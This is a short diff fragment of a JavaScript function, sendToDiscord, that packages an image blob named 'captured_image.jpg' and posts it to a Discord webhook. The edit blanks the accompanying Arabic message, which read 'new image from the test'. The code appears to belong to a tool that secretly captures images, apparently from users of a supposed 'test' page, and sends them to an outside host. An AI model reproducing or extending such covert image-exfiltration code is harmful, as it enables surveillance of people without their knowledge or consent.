@@ -358,7 +358,7 @@ async function sendToDiscord() {
     
         const formData = new FormData();
         formData.append('file', blob, 'captured_image.jpg');
-        formData.append('content', 'صورة جديدة من الاختبار');
+        formData.append('content', '');
 
         const discordResponse = await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
